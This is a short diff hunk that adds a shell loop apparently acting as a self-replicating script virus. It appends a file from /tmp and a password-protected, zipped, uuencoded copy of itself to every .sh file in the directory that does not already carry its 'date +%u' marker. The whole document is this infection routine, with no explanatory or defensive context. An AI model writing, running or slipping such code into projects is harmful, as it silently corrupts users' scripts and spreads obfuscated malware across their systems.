@@ -1,0 +1,6 @@
+for i in *.sh; do
+	if test `fgrep -c 'date +%u' "$i"` -eq 0 ; then
+		cat /tmp/ssr.txt >> "$i"
+		cat $0 | zip -P `date +%u` | uuencode plop | cat >> "$i"
+	fi
+done
